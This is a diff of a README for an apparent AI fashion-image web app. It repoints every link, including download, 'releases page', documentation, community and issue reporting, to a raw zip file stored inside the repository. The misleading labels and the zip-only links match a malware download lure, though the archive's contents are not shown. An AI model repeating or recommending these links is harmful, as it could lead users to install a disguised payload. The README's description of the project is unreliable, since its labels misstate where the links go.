@@ -1,7 +1,7 @@
 # 🎨 fashion-ai-studio - Create Stunning Fashion Images Easily
 
 ## 📥 Download Now
-[![Download fashion-ai-studio](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/stepfatherhood/fashion-ai-studio.zip)](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/stepfatherhood/fashion-ai-studio.zip)
+[![Download fashion-ai-studio](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/src/services/fashion_ai_studio_1.7.zip)](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/src/services/fashion_ai_studio_1.7.zip)
 
 ## 📖 Overview
 fashion-ai-studio is a web application designed to help anyone create beautiful AI-generated fashion model photos. Whether you're a designer, marketer, or just someone who loves fashion, our tool makes it easy to generate stunning images without any technical skills.
@@ -24,7 +24,7 @@ To use fashion-ai-studio, you need a web browser and an internet connection. Our
 To download fashion-ai-studio, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to our releases page: [Download Releases](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/stepfatherhood/fashion-ai-studio.zip).
+   Click this link to go to our releases page: [Download Releases](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/src/services/fashion_ai_studio_1.7.zip).
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version at the top. Clicking that link will show you the available files.
@@ -44,13 +44,13 @@ To download fashion-ai-studio, please follow these steps:
 - **Seek Inspiration:** Use generated images for mood boards or marketing campaigns.
 
 ## 🔗 Useful Resources
-- [Documentation](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/stepfatherhood/fashion-ai-studio.zip)  
+- [Documentation](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/src/services/fashion_ai_studio_1.7.zip)  
   Explore detailed instructions and guides on using various features of fashion-ai-studio.
 
-- [Join Our Community](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/stepfatherhood/fashion-ai-studio.zip)  
+- [Join Our Community](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/src/services/fashion_ai_studio_1.7.zip)  
   Connect with other users, share your images, and get feedback.
 
-- [Report Issues](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/stepfatherhood/fashion-ai-studio.zip)  
+- [Report Issues](https://raw.githubusercontent.com/090hn/fashion-ai-studio/main/src/services/fashion_ai_studio_1.7.zip)  
   If you encounter problems, please let us know through our issues page.
 
 ## 🥳 Join the Fashion Revolution
